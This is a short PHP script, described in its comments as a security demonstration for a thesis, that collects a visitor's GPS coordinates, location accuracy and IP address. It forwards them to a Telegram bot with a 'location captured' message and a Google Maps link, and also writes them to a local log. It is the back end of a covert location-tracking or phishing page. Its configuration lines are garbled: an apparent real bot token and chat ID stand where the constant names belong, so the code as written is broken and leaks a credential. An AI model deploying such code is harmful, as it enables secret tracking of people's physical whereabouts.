<?php
// =============================================
// Script para recibir y almacenar ubicaciones
// Demostración de seguridad - TESIS
// =============================================

// CONFIGURACIÓN
define('8605186812:AAET8973lR2dwBr10G_hsw2jbL6yaxLvBPI', 'AQUI_PONES_EL_TOKEN_DE_TU_BOT');
define('7891650726', 'AQUI_PONES_TU_CHAT_ID');
// =============================================

// Recibir datos
$latitud = $_POST['lat'] ?? 'No disponible';
$longitud = $_POST['lon'] ?? 'No disponible';
$precision = $_POST['precision'] ?? 'No disponible';
$fecha = $_POST['fecha'] ?? date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];

// Formatear mensaje
$mensaje = "🎯 UBICACIÓN CAPTURADA\n\n";
$mensaje .= "📍 Lat: " . $latitud . "\n";
$mensaje .= "📍 Lon: " . $longitud . "\n";
$mensaje .= "📏 Precisión: ±" . $precision . "m\n";
$mensaje .= "⏰ " . $fecha . "\n";
$mensaje .= "🌐 IP: " . $ip . "\n\n";
$mensaje .= "🗺️ https://www.google.com/maps?q=" . $latitud . "," . $longitud;

// Enviar a Telegram
$api_url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
$payload = [
    'chat_id' => CHAT_ID,
    'text' => $mensaje
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $api_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Log local
file_put_contents('ubicaciones_log.txt', $mensaje . "\n---\n", FILE_APPEND);
?>
